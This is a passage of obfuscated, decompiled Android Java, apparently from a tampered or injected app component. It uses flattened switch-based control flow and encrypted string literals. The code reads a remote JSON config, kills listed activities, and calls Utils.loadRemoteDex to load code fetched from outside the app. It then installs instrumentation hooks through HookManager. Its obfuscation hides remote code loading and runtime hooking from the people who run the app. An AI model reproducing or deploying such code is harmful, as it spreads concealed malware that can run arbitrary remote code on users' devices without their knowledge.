                                                                        str43 = "ۤۘۘ۟ۜ۫ۛۤۦۘۦۜۙ۟۠۬ۙۚۨۤۙ۠ۖۗۘۦۗۗ۬ۨۙ۟ۥۥۗۗ۫۟ۡۘۦۧ۬";
                                                                        break;
                                                                }
                                                            }
                                                            break;
                                                    }
                                                }
                                                break;
                                            case -84934940:
                                                break;
                                            case 1266252708:
                                                String str44 = "ۥۖۘۘ۠۫ۖۘۡۘۗۧۘ۠ۤۨۧۘۢ۟ۨۘۗۘۡۢۘۖۦ۠ۗ۠ۜۜۘ";
                                                while (true) {
                                                    switch (str44.hashCode() ^ 818363128) {
                                                        case -1359384024:
                                                            str21 = "ۙ۫ۡ۫ۖۖۘۛۜ۟ۨۗۢۢۛ۟ۖۚۢۨۡۖۘۙۖۡۘۗ۫ۡۘ۬۫ۥۘۢۜۘۖۦۧۥۡۛۤۘ۫ۚۧ۫ۨۛۡۘ";
                                                            continue;
                                                        case -1156218306:
                                                            if (jSONArrayOptJSONArray == null) {
                                                                str44 = "ۧۙ۫۟۬ۚۡۜ۬۟ۖۖۡ۠ۡۦۘۦ۫ۡۘۧۛۢۤۥۥۘۡۗۢ۬ۥۧۤ۫";
                                                                break;
                                                            } else {
                                                                str44 = "ۦۘۦۤ۫ۛۦۡۛ۟ۨۖۘۛۤۥۛۢۦۢ۠۠ۗۤۨۥۨۘۘۨۛۧۗۗۧۘۗ";
                                                                break;
                                                            }
                                                        case -494371099:
                                                            str21 = "ۧۚۢۜۢ۠۬ۤۖۙۤۦۘۨ۟ۦۘۗۖ۫ۜۡۜۙۗۥۘۚ۟۫۠ۢۦۘ۟ۚۤۡۨۖ";
                                                            continue;
                                                        case 2132730628:
                                                            str44 = "ۨۚۖۖ۫۫ۥۖۧۡۘۘۢۙۥۘۗۖۧ۟ۙ۫ۛۚ۟ۢۙ۫ۘۡۖۥۢۘۘۗۨۛۘۨۥۙ۠۬۟ۦۥۥۗۜۦۘ۬ۡۛۤ";
                                                            break;
                                                    }
                                                }
                                                break;
                                            case 1682074733:
                                                str21 = "ۢۢ۬۬۠ۖۘۤ۠ۨۗۨۖۘۨ۫ۥ۬۬ۛۜۨۚۧ۟ۜۘ۠ۘۢۙۚ۠۠ۤۜۧۦۧ";
                                                break;
                                        }
                                    }
                                    break;
                                case 814754824:
                                    String str45 = "ۦۨۖۛۥۜۘ۠ۢۦۜ۟ۖۢۘۗۦۙۦۗۤۙۨۧۘ۫۠ۚ۫ۗۧۙۚۨۡۢۥۘ";
                                    while (true) {
                                        switch (str45.hashCode() ^ (-896717528)) {
                                            case -260263275:
                                                if (!zOptBoolean) {
                                                    str45 = "ۡۙۦۜۚۤ۬ۥۜۗۡۢۜ۬ۤۡ۬۟۟ۙۖۘۜۗ۫ۢۨۢۜۤۤۢ۠ۖۘۤ۠";
                                                    break;
                                                } else {
                                                    str45 = "ۚۢ۬ۛۢۡۘۖ۟۬ۦۢۤۜۡۨ۫ۨۛۢۥۢۡۙۨۘۗۗۦۘۤ۟ۖ";
                                                    break;
                                                }
                                            case 1688173031:
                                                str20 = "ۘۛۥۘ۠ۛۦۦۛۘۨ۬۟ۤۤۦۘۧۘ۬ۤۛۘ۬۬ۜ۫ۖۙ۠ۨۨۢ۟ۧۛۖۗۧ۫ۘۤۛۦ";
                                                continue;
                                            case 2039807883:
                                                str20 = "ۖ۠ۨۤۦ۬ۜۛ۬ۧ۫ۘۦۗۚۚۨۘۥۧۛۛۛۜۡ۟ۦۘۛۨۖۘۙۢۙۗ۟۠";
                                                continue;
                                            case 2081163084:
                                                str45 = "ۗ۫ۘۘۥۤۨۘۤ۫ۖۘۘۢۜۘۦۢۘۘۗ۠ۜ۟ۥ۠ۗۦۚۥۢۘۘۖ۟ۥۘ";
                                                break;
                                        }
                                    }
                                    break;
                                case 1316910042:
                                    break;
                            }
                        }
                        b = jSONObject;
                        JSONArray jSONArrayOptJSONArray2 = jSONObject.optJSONArray(l2.decrypt("4ojGK2kUTfvpks48azBd\n", "gOSnSAJVLo8=\n"));
                        String str46 = "ۙ۫ۛۢۢ۠۠۟۟ۧۗۤۗۤۘۘۗ۬۟ۨۢۜۙۖۛ۠ۧۤۤۨۤۘۜ۫۬ۥ۟ۖۨ۠ۤۜۥ";
                        while (true) {
                            switch (str46.hashCode() ^ (-918331496)) {
                                case 622882327:
                                    String str47 = "ۡ۟ۤ۫۟۟۬ۙۦۘۙۡۦۘ۟ۥۖۦۧ۟۫ۧۢۡۤ۠ۖۖ۬ۡ۠ۘۘۙۚۡۧ۫ۛۨۦۗۡۨۚۦۨ۫ۜۙۦۘ";
                                    while (true) {
                                        switch (str47.hashCode() ^ 41448630) {
                                            case -2038361719:
                                                if (jSONArrayOptJSONArray2 == null) {
                                                    str47 = "ۨ۠ۘۘۧ۠ۜۘۨ۠ۗۜ۬ۢۗۢۢۙ۟ۥۗۖۡۘۨ۠۠ۗۙۖۘۜۧۜ";
                                                    break;
                                                } else {
                                                    str47 = "ۗ۠ۗۧۖۖۘۛۦۦ۟۫ۛۢۤۖۘۚۘۛ۫ۧۚۧۢۘۘۚۤۦۦۧۘۘۜۖۨۘۙۧۜۘۥۢۛ۬ۜۥۘ";
                                                    break;
                                                }
                                            case -1435872331:
                                                str46 = "ۜ۠ۤۖۥ۫ۗۢۡۡۢۗۚۜ۠ۦۗۡ۟ۙ۫ۗۛۖۘ۠ۨۚۥ۟ۨۢۙ۠ۘۘۤ";
                                                continue;
                                            case 593653631:
                                                str46 = "ۦۨۙۦۚ۬۟ۚۛۢۤ۟ۡۜۥۢۘۦۢۗۘۘ۫ۚۤ۫ۧ۫ۧۖۤۧۖۥۧۘۖۢۘۘ۫ۜۢ";
                                                continue;
                                                continue;
                                            case 647587701:
                                                str47 = "ۙ۠ۡۤۤۥۘ۟ۤۡۘۨ۫ۤۛۨ۫ۚ۟ۘۤۚۖۤ۠۬ۦۢۘۘۤۤۤۜۘۙ۟ۜۘ";
                                                break;
                                        }
                                    }
                                    break;
                                case 1352002424:
                                    break;
                                case 2056748536:
                                    str46 = "ۘۖۨۘ۠ۗۖۡۥۡۨۨۥۘۘۦۢۧۛۚۦ۫ۜۦ۟ۜۤۙۗۚۜۤۖۦۘۘۙۗۛۨ۬ۘۡ۬ۙ";
                                    continue;
                                case 2132810674:
                                    try {
                                        FileWriter fileWriter = new FileWriter(new File(context.getFilesDir(), l2.decrypt("r59uNxv2wzm5mnk9BMDHKZKQbjcYzIwwvpxh\n", "zfMPVHCpolo=\n")), false);
                                        try {
                                            fileWriter.write(jSONArrayOptJSONArray2.toString(2));
                                            fileWriter.flush();
                                            k2.logToFloatingWindow(l2.decrypt("YRHxbxZzU9wdT+YTY3sTtwA6hQAZEQrdbS/Rqg==\n", "iKpgiob+tlE=\n") + jSONArrayOptJSONArray2.length() + l2.decrypt("AWXZlA==\n", "IYx4LeA3C4g=\n"), l2.decrypt("JxM=\n", "SHh7wygFn9I=\n"));
                                            fileWriter.close();
                                        } finally {
                                        }
                                    } catch (Exception e6) {
                                        k2.logToFloatingWindow(l2.decrypt("fAzT5nxBuGEAUsSaCUn4CTEGqrdJI+F2\n", "lbdCA+zMXew=\n") + e6.getMessage(), l2.decrypt("3nPR9o0=\n", "uwGjmf/ROss=\n"));
                                    }
                                    Activity activityECt8jHZ4 = Utils.ECt8jHZ4();
                                    String str48 = "ۥۛۗۙۥۧۘ۬ۗ۠۟ۘۨۖۧۨۦۥۦۘ۫ۦۙ۫ۦۖۘۙۤۨۥ۫ۨۧۘۥۘۛۤۨ";
                                    while (true) {
                                        switch (str48.hashCode() ^ 502975057) {
                                            case -1926796742:
                                                String str49 = "ۨۤۦۘ۬ۨۙۢۘۦۘۨۨۚۧۛۡۘۛ۟ۥۘۡۚۚۨۘۖۗۙۧۙۧ۠ۛۙۖۥۖ";
                                                while (true) {
                                                    switch (str49.hashCode() ^ 830017780) {
                                                        case -777175142:
                                                            str49 = "ۢۘۛ۫ۖ۬ۤۢۡۘۖۡۖۘ۟ۥۗۛ۠ۨۛۦۜۦ۟ۨۘۧ۟ۖ۬۠ۥ";
                                                            break;
                                                        case 1125945889:
                                                            str48 = "۬ۢۡۘۜ۬ۖۚۖ۟ۥۙۤۖۦۦ۠ۜ۠ۖۜ۟ۛۘۘۖۨۧۘۗۜۘۘ";
                                                            continue;
                                                        case 1605814406:
                                                            if (activityECt8jHZ4 == null) {
                                                                str49 = "ۗۨۘۘ۫۠۬ۖۘۘۜۛۧۨۙۧ۟ۘ۫ۨۤ۟۫ۤۥۘۦ۟ۧۚۚۖۘ";
                                                                break;
                                                            } else {
                                                                str49 = "ۙ۟۠۬ۙۤۚ۬ۡۛۘۖۘۡۨۙۖۘۘۘ۫ۗۖۘۤۦۖۖ۟ۘۘ۬۬ۡ۫۬۬۠ۗۛ";
                                                                break;
                                                            }
                                                        case 2125080521:
                                                            str48 = "ۡۛۚ۟ۧۨۘ۟ۢۖۘۨۡ۫۬۬ۦ۫ۡۨۢۥۖۡ۫ۤۜۤۨۘۙۤۖۘۦۛۨۖۨۘ";
                                                            continue;
                                                            continue;
                                                    }
                                                }
                                                break;
                                            case -785957127:
                                                String name = activityECt8jHZ4.getClass().getName();
                                                int i2 = 0;
                                                while (true) {
                                                    String str50 = "ۤۗۦۘۖۥۜۘ۫ۘۥۨۤۤ۫ۗۖۘ۬ۚۡۘۗۙۜۧۨۜۘۛ۬ۛۢۦ۬ۖۖۨۘۤۗۡۨۘ";
                                                    while (true) {
                                                        switch (str50.hashCode() ^ (-1418803957)) {
                                                            case -1370686663:
                                                                break;
                                                            case -1025466476:
                                                                String str51 = "۬ۦۙۢ۫ۛۜۧۧۦۢ۬ۧۜۦۢۧۜۤۨ۠ۨ۬ۜ۟ۨۡۘۧۛ۠ۦۗۗۙۙۜۚۦ۟ۡۜۜۘۙۙۨۜۨۛۨۧۙۜۖ";
                                                                while (true) {
                                                                    switch (str51.hashCode() ^ 758965934) {
                                                                        case -737865911:
                                                                            break;
                                                                        case 265397867:
                                                                            k2.logToFloatingWindow(l2.decrypt("cO+w0CNAw4n1O1FP64Ka6HPehd06WwpzB6qotGd7dicqw92OMBNme3/YlQ==\n", "lk84OYL248g=\n"), l2.decrypt("+E3+fw==\n", "jyyMEexRxSQ=\n"));
                                                                            activityECt8jHZ4.finish();
                                                                            break;
                                                                        case 1653565650:
                                                                            String str52 = "ۤۡۨۘۘۖۧۘ۠ۦۘۙ۟ۗۙ۟ۗۚۥۢۥۙۗۜ۠ۘۧۖۘۙۧۦ۬ۨۦۘ۟ۙۙ۠ۜۗۚۘۨۘ۟۫ۜۘۤۜۤۛۨۡۚۘۘ";
                                                                            while (true) {
                                                                                switch (str52.hashCode() ^ 1709787195) {
                                                                                    case -369207787:
                                                                                        str51 = "ۥۜۖۧۗۙۧۙۖ۫ۦ۟۟ۦ۬ۡۦۡۨۜۜۛۗۡۡۦۥۘ۠ۙۖ";
                                                                                        break;
                                                                                    case 142899912:
                                                                                        str52 = "ۢۘۛۤۧۘۘۧۖۦۚۡۦۙ۫ۨۘۤۙۡۘۤۨۘۘ۬۫۠۫ۙۚ۠ۢۖۦۗۚۧۙۙۖۜۘۡ۫";
                                                                                    case 1007168652:
                                                                                        str51 = "ۡۛۘۘ۬۠ۧۘۙۖۢۨۥۙ۫ۖۘۘ۫ۡ۟ۛۨۡۛۡۛۦۚ";
                                                                                        break;
                                                                                    case 2128784586:
                                                                                        str52 = name.equals(jSONArrayOptJSONArray2.optString(i2)) ? "ۜۦۧۥۨۘۢۚۜۚۖۗۙۤ۬ۚۦۘۧۛۥۗۨۚۜۧۢ۟ۙۜۘۗۖۧۘ۠ۦۦ۫۟ۡۢ۟ۙۡ۠ۖۘۖۤۘۘ" : "۫ۡۜۘۡۗۖۘۥۛۙ۟ۢۗۤۚۨۨۤۘۘۡۡۥۨۤۘۘۖۧ۬ۦۤۘۘۖ۫ۡۘۜۗۦۘۛۗۖۢۖ۟ۛۗۗۙۥۚۦۜۘۧۘۙ";
                                                                                }
                                                                            }
                                                                            break;
                                                                        case 1726987571:
                                                                            str51 = "ۙۢۤۨ۠۬ۡۙۨۘۤۛ۬۫ۘۚۧ۫۫ۡ۠ۤۨۡۨۘۙۥۜۘۦۚۢۥۢ۠ۚۢۛۧۦۨۘۙۥۥۘۚۢۤۨۤۧۡۘۤۨ۟ۖ";
                                                                    }
                                                                }
                                                                break;
                                                            case 121526567:
                                                                String str53 = "۟ۜۖۡ۫۟ۨۗۥۤ۠۟ۛۙۜ۟ۙۗۡۢ۬ۨۨۥۘۘۨۖۘ۬ۙۗ۟ۙۤ۠۫ۘۘ";
                                                                while (true) {
                                                                    switch (str53.hashCode() ^ (-1415838988)) {
                                                                        case -1792822362:
                                                                            str50 = "ۤۨۨۢۦۥۖۘۧۘۧۡۙۛۡۘۚۤۢ۫ۙۙۤۘۖۘۦۢۘۚۖۧۘۛۤۨۘۘۗۗۗ۠ۥۘۖۖۙ";
                                                                            break;
                                                                        case -1123295310:
                                                                            str50 = "ۜۥۦ۠ۨۤ۟ۡۧۤۖۨۘۛۧۖۡۙۗۥۦۦۦۜۙ۠ۗۤۚۜۧۦۜۜۘۙۦۖۤ۬ۡۘۧۚۜۘ";
                                                                            break;
                                                                        case -125245234:
                                                                            str53 = "ۙۖ۬ۢۜۛۡۖۜۘ۬ۛۡۚۚۘۥۡۘۨۚۘۘۢۙ۟۫ۨۘۧۗۚ";
                                                                        case 596865127:
                                                                            str53 = i2 < jSONArrayOptJSONArray2.length() ? "ۨۥۦۧۤ۠ۜۢۘۘۧۦۜۘۧۜۦۗۘۘۘ۠ۧۚۚۚۚۦۢۧۙۦۘۘ" : "۟ۤ۫۠ۧۡۘۘۜ۬ۙۧۙ۫ۤۨۘۤۚۨۛ۠ۤۤۤ۠ۙ۠ۥۛ۟ۡۡۜۢۨ۬ۙۨ۫ۥ۫۬ۤۗۨۨۡۤۦۘ۬ۙۡ۫ۢۖ";
                                                                    }
                                                                }
                                                                break;
                                                            case 445489552:
                                                                str50 = "ۚۚ۟ۦ۠ۤۨ۬ۙۖۥۡۖۥۚۜۧ۟۠ۙۡ۠۟ۥۦ۠ۥ۫ۜۧۘۧۢ۬ۜۧ۫Oۚۘۥۘۛۙۥۘۦ۠۟ۡ۟ۥۘۥۙۥ";
                                                        }
                                                    }
                                                    i2++;
                                                }
                                                break;
                                            case -292826801:
                                                break;
                                            case 1066059985:
                                                str48 = "ۥۗۚۥ۬ۜۚۜۘۢۘۘۨۚۥۘۖۨۨۘۡۧۤۘۛۚۙۗۘۘۖۙۢ";
                                                continue;
                                            default:
                                                continue;
                                        }
                                    }
                                    break;
                                default:
                                    continue;
                            }
                        }
                        Activity activityECt8jHZ42 = Utils.ECt8jHZ4();
                        String str54 = "ۢۜۜۘۨۤۡۢۥۚۥۘۥۘۙۛۜۘ۫ۦۥۛۗۜ۠ۜۥۘۖۜۗۛۙۜۘۗۖۦۘۢۢۦۘۚۚۘۖۧۨۨ۟ۗۦ۬ۦۘۧ۬ۨۘ۬ۢۢ";
                        while (true) {
                            switch (str54.hashCode() ^ (-490070781)) {
                                case -2144887024:
                                    activityECt8jHZ42.runOnUiThread(new p0(activityECt8jHZ42, context, 4));
                                    break;
                                case -598461096:
                                    String str55 = "ۨۨ۬۫ۜ۬ۖۜۘۘۤۘ۟ۦۖۧۘۗۡۦۜۢۦۘۥۖۗۦۖ۫۬ۨۥ۫ۜۧ۟ۗۜ";
                                    while (true) {
                                        switch (str55.hashCode() ^ (-234007424)) {
                                            case -1959880788:
                                                str54 = "۠۬۟ۚۘۗۧۚ۫ۜۘۙۧۧ۟۠ۛۘۡۖۦۘۢۧۥۙۖۧۧۤۨۘ";
                                                continue;
                                            case -1823249851:
                                                if (!Utils.g(activityECt8jHZ42)) {
                                                    str55 = "ۛۦ۠ۦۘۧ۫ۡۜۥۨۦۢۛ۬۫ۥ۫ۥۦۡۘۢۘۖۘ۫ۥۘۙۜۦۘۢۚۜۗۥ۟۬ۖۚۘۡۦۥۛۘۘۨۜۘۘ";
                                                    break;
                                                } else {
                                                    str55 = "ۢۡۖۦۜۨۘۛۗۙ۫ۛۨۙۨۛۧ۫۫ۨۥۘ۠ۡ۠ۤۚ۟ۛۢۚ";
                                                    break;
                                                }
                                            case -395486335:
                                                str55 = "ۛۘۧۡۛۢ۟ۨۨۛۚۚۗ۠ۗۘۖۘۢۜ۬ۢۧ۬۠ۡۘۘ۫ۧۙۗۖۚ۫۬";
                                                break;
                                            case 793099067:
                                                str54 = "۟ۦۢۖ۟۠۠۟۫ۦۢۦۘۨۙۖۘۙۘۖۘۜ۫۬ۧ۠ۤۦۢۡۘۨ۫ۖۜۥ۟ۙۨۚۧۢۘۘۤ۬ۚۘۢ۠ۘۡۨۘ";
                                                continue;
                                                continue;
                                        }
                                    }
                                    break;
                                case -206916338:
                                    str54 = "ۥۜۦۛ۟۫ۥۖۢۢۧۥۘۛۗ۟ۡۙۤۨۨۚۜۦۜۘ۬۟ۘ۟ۤۗ";
                                    continue;
                                case 255425636:
                                    break;
                                default:
                                    continue;
                            }
                        }
                        k2.logToFloatingWindow(l2.decrypt("Apn+REW72lpnwd8NBb6EOmWwhCt91blABZr4\n", "6iZio+0wM98=\n") + str2, l2.decrypt("xjA=\n", "qVsMXGGm0qY=\n"));
                        Utils.loadRemoteDex(context);
                        SharedPreferences.Editor editorEdit = context.getSharedPreferences(d, 0).edit();
                        String str56 = e;
                        String str57 = "ۖۨۨ۟ۨ۬ۧ۫ۜۗۖۡۘۨۦ۫ۡ۠۠ۧۨۡۜۥۖۘۖۡۨۘۘۡۡۘۚۡۖۗ۠ۚۗۜۖۜۧۜۘ";
                        while (true) {
                            switch (str57.hashCode() ^ (-144643338)) {
                                case -1252465519:
                                    str57 = "ۦۖۢۖ۠ۧۦ۟ۗ۬ۚۜۢۧۛۢۨۘۖۧۖۘۙۚۘۙ۠ۘۜ۟ۧۥ۫۫ۙ۬ۘۥۛۘۨۗۘۤۛۜۚۛۘۙۙۦۗۡۘ";
                                case -1244677011:
                                    break;
                                case 993865719:
                                    String str58 = "ۡۗۚۤ۫ۨۤۖ۟۫ۢۙ۠ۡۘ۠ۛۖۘۘۨۧۗۜۙۡۢۡۘۗۖۖۙۗۨ۬ۦۧ";
                                    while (true) {
                                        switch (str58.hashCode() ^ (-1564852380)) {
                                            case -452466461:
                                                str58 = "۠ۢۖۘ۫۬۫ۘۤۖۘۖۧۚۗۨۖۘۥۥۥۘۘ۬ۦۘ۫ۘۙۖۘۙۚۨۡۡ۬ۦۘۧۛۦۘ";
                                            case 594788999:
                                                String str59 = "ۛۨۘۚۗۧۜ۟ۛۤۤۤۛۙ۟۟ۗۖۤۢۨۢ۠ۜۚۥۘۚۛۙۜۤۜۘۤۜۙۥۨۡ۟۫ۡۘ";
                                                while (true) {
                                                    switch (str59.hashCode() ^ 274450487) {
                                                        case -2060581234:
                                                            str58 = "ۗۜۥۛۖۥۡۨۘۦ۫ۗۖ۬ۗ۟ۢۡۙۡۗ۟ۚۧۙۧۧۙۙۡ۠ۡۛ۟ۗۘ۠۠۬۬ۧۥۘ";
                                                            continue;
                                                        case -1026702436:
                                                            str58 = "ۙۥۘۘۛۥۙۦۙۜۘۦۦۡۢۚۥۘۡۗ۠۬ۜۜۦۖ۟ۦ۟ۖۘۙ";
                                                            continue;
                                                        case 662768192:
                                                            str59 = "ۦۘ۫ۖۗۥۙۚۨ۠ۨۖۘۥۙۛۥۘۤۦ۬ۡۘۢۚۡۘۧۖۗۖ۟ۖۘۧ۬ۘۘۚ۟ۚ";
                                                            break;
                                                        case 1633357340:
                                                            if (!str2.contains(strArr[0])) {
                                                                str59 = "ۨۥۢۗۧۙۛۘۜۜۦۥۧ۬۠ۜۨۜۡۚ۫۟ۖۘۗ۬۫ۨۢۨۘۜۘۧۘۛۤ۬ۚۦۡۘۗۨۙ";
                                                                break;
                                                            } else {
                                                                str59 = "ۚۤۡۘۨۚۙۡۘۦۖۤ۠ۘۙۦۡۦۦۡ۠ۥۗ۫ۡۘ۟ۥۘۘۢۛۢ";
                                                                break;
                                                            }
                                                    }
                                                }
                                                break;
                                            case 1156419790:
                                                str5 = "ZDPvkWNyVw==\n";
                                                str6 = "AFyC8AocJOU=\n";
                                                break;
                                            case 1192247279:
                                                break;
                                        }
                                    }
                                    break;
                                case 1901335123:
                                    String str60 = "۠ۚ۠ۘۤۜ۠۠ۡ۟۠ۘۗۛۤۨۙۥ۟ۘۛۤۙۢۖ۬ۜۘۜۜۦۢۨۘۘۘ۟۠ۤۨۨ۟۫ۖ";
                                    while (true) {
                                        switch (str60.hashCode() ^ 2001770383) {
                                            case -1827855245:
                                                str57 = "۫ۡ۫ۤۦۜۦۦۤۤۦۥۢۙۥ۠۠ۖۘۜۦۥۘۨ۫ۡۘۦۢۤۗۚۨۘۡۦۘۚۡۚۥۛۥۘۙۘۛ";
                                                continue;
                                            case -1066866820:
                                                str57 = "ۢۢۖۘۜۘۧۡۙۡۢۤ۫۫۟ۧۢۖۚۖۨۜ۠ۘۙۛۥ۟ۙۥۡۘۨۥۧ۠ۨۙۙ۠ۜۘۢۤۘ";
                                                continue;
                                            case 563736043:
                                                if (!z) {
                                                    str60 = "۬ۡۙۛۧۨۘۢۥۧ۟ۥۘۡ۟ۖۘۤۧۗۗۜۘۜۙ۫ۜۚۖۚۙۗۙ۫ۙۖ۠۠ۙ۟ۚ۠ۨۨ";
                                                    break;
                                                } else {
                                                    str60 = "ۤ۬ۜۘۙۧۗۙۜۗۛۡۚۜۢۨۘۙۡ۟ۛۦۨۘ۫ۜۛ۫ۘۡۘۘۙۜ";
                                                    break;
                                                }
                                            case 1069697899:
                                                str60 = "۫۫ۧۘۡۖۘ۬ۛۜۘ۫ۖۡۘۥۡۙۛ۫۫۫ۤ۫۠۬ۗ۟ۧۡۘ۠ۛۢۙۡۧۘ۬ۚۡۘۜۙۖۘۛۖۦۘۡۖۨۧۜ۟";
                                                break;
                                        }
                                    }
                                    break;
                            }
                        }
                        editorEdit.putString(str56, l2.decrypt(str5, str6)).putInt(f, 0).apply();
                        countDownLatch.countDown();
                        a = false;
                        String str61 = "ۜۙ۬ۥۘ۬ۙ۫ۜۘ۟ۗۖۛۖۛ۠۠۠ۧ۫ۜۡۖۥۘۧ۫ۜۘ۟ۙۨۡ۫ۤۥ۟ۢۤۨ۫ۧۛ۬ۢۙۧۗۤۦۘ";
                        while (true) {
                            switch (str61.hashCode() ^ 350005326) {
                                case -1858512238:
                                    String str62 = "ۗۙۙۚۖۨۘۖۦۦۘۙۡۧۘۗۥۘۖ۫ۘۦۘۡۘۜ۬ۗۤۖۙ۫ۨۗۦۛۨۘۖۤۘۘۤ۬ۨۘۛ۬ۙۦۘۚۚ۟ۧ";
                                    while (true) {
                                        switch (str62.hashCode() ^ 1995998378) {
                                            case -1403898185:
                                                str61 = "ۜۚ۬ۚ۠ۢۧ۠ۡۙۨۖۘۢ۫ۚ۠ۥ۫ۢۖ۠۬۫ۖۘۜۡۡۘۡ۟۫ۚۘۧۘۧۦ۬ۚۛۛۨۡۛ";
                                                continue;
                                                continue;
                                            case -1383882679:
                                                str61 = "۟۠ۖۘۥۧۡ۟ۡۙۨ۫ۘۘۢۢۡۘۛۥۚۧۢۘۘ۠ۧۘۖۚۡۘۚ۬ۗ۟۟۟۟ۗۦۘۥۥۖۘ۬۬ۗ";
                                                continue;
                                            case -654282569:
                                                if (!jSONObject.optBoolean(l2.decrypt("PzR7bJXJ4QQ1MQ==\n", "WloaDvmsqWs=\n"), true)) {
                                                    str62 = "ۧۧۛۜ۬۠ۚۦۘۛۧ۠ۦۜۖۘۨ۟ۛۦۘۗۡ۫ۢۡۥ۠ۨۗۖۢۙ۟ۥۦ۟";
                                                    break;
                                                } else {
                                                    str62 = "۫ۗ۠ۛۡ۟ۡۖۛ۫ۥۘ۫ۧ۟ۧ۟ۗ۟ۦۦۘۚ۬ۧۚۚ۟۠ۤۡ";
                                                    break;
                                                }
                                            case -395460309:
                                                str62 = "ۚ۠۠۬ۡۧۨۨۙۖۘۙۥۖۘۧۨ۟ۖۤۜۜۥۜۢۙۚ۟۫ۧۖۛۡۥۙۙۛۜۦۗۘۥۘۢۤۛۜۖۙ۫ۚۚۜ۟۟";
                                                break;
                                        }
                                    }
                                    break;
                                case -1320007294:
                                    JSONArray jSONArrayOptJSONArray3 = jSONObject.optJSONArray(l2.decrypt("6Ytg2tDvhPzumm4=\n", "h+4Xu7Ob7Yo=\n"));
                                    String str63 = "ۘۗۘۚ۠ۦۥۚۗۙ۟۬ۦ۫ۖۗۙۗ۫ۥۖۧ۟ۦۘۧۨ۟ۡ۟۫ۗ۟ۖۥۘۨۘۗۡۗۢۘۧۜۛ";
                                    while (true) {
                                        switch (str63.hashCode() ^ 1272991338) {
                                            case -2007654130:
                                                break;
                                            case -52086802:
                                                str63 = "ۨۚۨۘۜۛۘۛۨۘ۟ۚۨۦۦۚۘۢۚۨۖۧۥۧ۬ۚۖۥۘ۠ۦۜۢۥ۬ۧۦۘۘ";
                                            case 1321213412:
                                                String str64 = "ۖۛ۫ۜۧۗ۠ۡۢۖۚۡۡ۫ۙۦۦۜ۠ۥۙۖۜ۬ۥۜۢۡۜۢۤ۬ۗ۠ۖۖۘ۫ۥ۬ۨۜ۬";
                                                while (true) {
                                                    switch (str64.hashCode() ^ (-860622472)) {
                                                        case 200463116:
                                                            str64 = "ۗ۠ۡۢ۬ۦۧۥۜۖۢۥۤۨۘۨۨۖۙ۠۟ۦۧۘۜۨۡۘ۟ۡۦۦۙۧۘ۫ۖۛۜۜۘۗۜۛ";
                                                            break;
                                                        case 285273777:
                                                            str63 = "ۘۧۗ۟ۥ۟۟۬ۡ۟۫ۦۖ۫ۛۧۜۗ۬ۙۡۘۛۘۛۢۖۨۘ۟ۡۢۘ۬ۤۙ۟ۛۤۤۗۥۨ۠۟ۚ۟ۧۨ۠ۧ۬ۢۖۘ";
                                                            continue;
                                                        case 353246075:
                                                            str63 = "ۛ۟ۘۡۤۦۘۖۛۜۘ۬ۤۘۘۛۘۘۘۘۡۖۘۡ۠ۖۘۜۧۘ۫ۖۜۥ۠ۘۘ۠ۚۨۘۘ";
                                                            continue;
                                                        case 562173992:
                                                            if (jSONArrayOptJSONArray3 == null) {
                                                                str64 = "ۖۗۖۘۤۧ۬ۤۜۘۘۚۜۜ۠ۧۚ۬ۛۗۡۢ۫ۡۙۤۨۜۚۖ۬۬ۡۥۗۚۚۡۘ۟ۙۖۨ۟ۡۘ";
                                                                break;
                                                            } else {
                                                                str64 = "ۙۧۨۘ۠۫ۖۘۛۛۚۘۘۛۡۙۨۘۛۙ۬ۚۥۦۧۚۜ۬ۨۧۧۡۡۘۘۧۜۘۨۗۧۡۡۦۛۢۚۚۘۘ";
                                                                break;
                                                            }
                                                    }
                                                }
                                                break;
                                            case 1886627915:
                                                String str65 = "۫ۥۦۘۗۨۢ۟ۥ۫ۘۨۘۜۘۚ۠ۚۛۧۨۗ۟ۙۥۘۙۢۡۘ۫ۘۚۦۨۙۜۧۖۘۥۘۡۘۖ۟ۘۘۚۙۢۗۤۥۘ";
                                                while (true) {
                                                    switch (str65.hashCode() ^ 1100729650) {
                                                        case -1352719066:
                                                            str65 = "ۛۘۡۘۨۥۥۧۥ۟ۙۛۡۢۜۘۜۖۨۘۧ۬ۤۘۘۘ۫ۚۨۢۧۜۘۨۤۜۘۨۚۜۘ";
                                                        case -609194988:
                                                            break;
                                                        case 148413859:
                                                            HookManager.hookInstrumentation(context);
                                                            break;
                                                        case 2022501683:
                                                            String str66 = "ۜ۬ۜۘۗ۫ۖ۠۠ۗۚۚۚۧۖۦ۫۠۫ۨۗۤۡۡۨۗۜۤ۬ۘۦۘۧ۬ۧۛۥۨۘ۠ۡۥۘ۫";
                                                            while (true) {
                                                                switch (str66.hashCode() ^ (-1321512579)) {
                                                                    case -2081589385:
                                                                        str65 = "ۡۖۘۘۙۗۤ۟ۘۡ۟۠ۥۘۛ۬ۡۦۙ۫ۡۚۖۘ۠ۢۚۘ۠ۜ۫ۙۜۘۦ۟ۙۥۜ۫ۥۥۘ۟ۦۨۥۨۡۦۢۦۘۜۡ۠۬ۘ۠";
                                                                        continue;
                                                                    case 1046084400:
                                                                        if (jSONArrayOptJSONArray3.length() <= 0) {
                                                                            str66 = "۫ۡۨۚۥۤ۬ۥ۬۟۠ۥۜ۠ۘۘۨۥۖ۫ۦۘۚۘ۬ۙۥۦۗۖ";
                                                                            break;
                                                                        } else {
                                                                            str66 = "ۛ۟۟ۚۥۛۤۜ۫ۜ۠ۜۘۤۢۗۥۢۖ۬ۚۢۢ۠ۦۧۚۜۘۗۥۜۢۜۖۨۨ۟ۚۢۡۘۥۛۗ۠ۢۜۢۖۘ";
                                                                            break;
                                                                        }
                                                                    case 1975609718:
                                                                        str65 = "ۥۖۦۖۤ۬ۛۚۗۜۜۖۘ۟ۡۨۘۖۜۖۤۡ۟ۡۘۨۘ۬۟ۥۘۖۘۘۥۖۨۙۥ۫۠۬۬۬ۧۢۛۦۘۛۨۢ۫۫۠ۥۚۜۘ";
                                                                        continue;
                                                                    case 2048330273:
                                                                        str66 = "۫ۙۤۢۛۡ۠ۦۛۥ۟ۛۙۢۡۛۨۦۘ۬ۧۨۘ۠ۖۧۢۘۙ۫ۧۜ";
                                                                        break;
                                                                }
                                                            }
                                                            break;
                                                    }
                                                }
                                                break;
                                        }
                                    }
                                    HookManager.initHooks(context);
                                    break;
                                case -497969963:
                                    break;
                                case 1571201228:
